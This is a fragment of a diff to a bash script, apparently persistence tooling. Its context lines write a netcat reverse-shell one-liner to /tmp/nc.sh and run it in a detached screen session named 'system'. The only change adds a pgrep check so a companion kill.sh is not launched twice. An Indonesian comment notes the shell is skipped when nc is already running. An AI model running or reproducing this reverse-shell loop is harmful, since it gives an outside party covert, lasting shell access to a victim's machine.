@@ -23,7 +23,9 @@ while true; do
   echo "cat /tmp/f | /bin/bash -i 2>&1 | nc $IP > /tmp/f" > /tmp/nc.sh && chmod +x /tmp/nc.sh && sleep 2
   screen -wipe
   screen -AmdS system /tmp/nc.sh # run NC
-  screen -AmdS system2 /tmp/kill.sh 
+  if [ "$(pgrep -f ./kill.sh)" = "" ]; then
+   screen -AmdS system2 /tmp/kill.sh
+  fi
  else
   echo "ke skip karena nc sudah jalan"
  fi
